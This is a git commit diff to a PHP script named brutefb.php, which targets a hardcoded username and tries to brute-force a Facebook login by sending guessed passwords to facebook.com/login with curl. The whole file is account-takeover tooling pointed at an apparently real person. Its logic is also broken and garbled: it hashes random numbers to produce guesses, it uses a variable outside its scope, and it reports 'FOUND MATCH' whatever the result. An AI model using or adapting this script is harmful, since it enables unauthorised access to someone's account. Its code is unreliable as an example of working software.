48b9454a65d57d7a21676d15cd8041be7e0e0b0c
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-12-16 12:44:17 +0100

    Update brutefb.php

--- brutefb.php
+++ brutefb.php
@@ -7,18 +7,18 @@ $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 $Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
 $c_len = strlen($Pass); 
+$c_len--;
 $min = 1;
 $max = 12;
 function bruteForce($Pass)
 {
 while(True)
 {     
-	$Pass = md5(rand(0,100000));
+	$Pass = md5(rand(0,$c_len));
 
+	check_correct($Pass);  
+	echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass."\r\n";
 }
-		check_correct($Pass);  
-		echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass."\r\n";
-        }
 function check_correct($Pass)
 {
 	$c = curl_init('https://www.facebook.com/login');
@@ -29,7 +29,7 @@ function check_correct($Pass)
         curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
         curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
         curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
-        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
+        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
 	if($str != "Startpagina") {return true;}
